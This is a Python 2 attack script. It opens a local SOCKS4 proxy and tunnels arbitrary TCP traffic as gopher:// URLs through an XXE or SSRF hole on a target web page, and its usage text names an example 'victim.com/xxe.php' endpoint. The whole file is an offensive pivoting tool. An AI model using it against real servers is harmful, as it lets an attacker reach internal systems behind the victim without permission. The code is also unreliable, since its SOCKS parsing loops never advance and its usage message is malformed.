#!/usr/bin/env python

import sys
import socket
import thread
import binascii
import struct
import urllib
import urllib2
HOST = 'localhost'
PORT = 65432
BUFSIZ = 4096
TIMEOUT = 5
SOCKS = True
CONNECT = "gopher%3A//"

def decodesocks(req):
	if req[0] != '\x04':
		raise Exception('bad version number')
	if req[1] != '\x01':
		raise Exception('only tcp stream supported')
	port = req[2:4]
	host = req[4:8]
	if host[0] == '\x00' and host[1] == '\x00' and host[2] == '\x00' and host[3] != '\x00':
		byname = True
	else:
		byname = False
	userid = ""
	i = 8
	while req[i] != '\x00':
		userid += req[i]
	extra = ""
	if byname:
		while req[i] != '\x00':
			extra += req[i]
	return host, port, extra

def child(sock,addr,base):
	try:
		if SOCKS:
			req = sock.recv(BUFSIZ)
			host, port, extra = decodesocks(req)
			if extra == "":
				dest = socket.inet_ntoa(host)
			else:
				dest = extra
			destport, = struct.unpack("!H", port)
			sock.send("\x00\x5a"+port+host)
		data = sock.recv(BUFSIZ)
		#print "sending:", data
		encodeddata = urllib.quote(data)
		url = base+CONNECT+dest+":"+str(destport)+"/A"+encodeddata
		#print "connecting to ", url
		ret = urllib2.urlopen(url,timeout=TIMEOUT)
		retdata = ret.read()
		#print "received:", retdata
		if len(retdata) > 0:
			sock.send(retdata)
		sock.close()
	except Exception as e:
		print e
		sock.close()

if __name__=='__main__': 
	if len(sys.argv) != 2:
		sys.exit('Usage: %s BASEURL\nExample: %s "http://victim.com/xxe.php?uri="' % sys.argv[0], sys.argv[0])
	base = sys.argv[1]
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((HOST, PORT))
	server.listen(2)
	print 'listener ready on port', PORT
	try:
		while 1:
			client, addr = server.accept()
			#print 'connection from:', addr
			thread.start_new_thread(child, (client,addr,base))
	except KeyboardInterrupt:
		server.close()
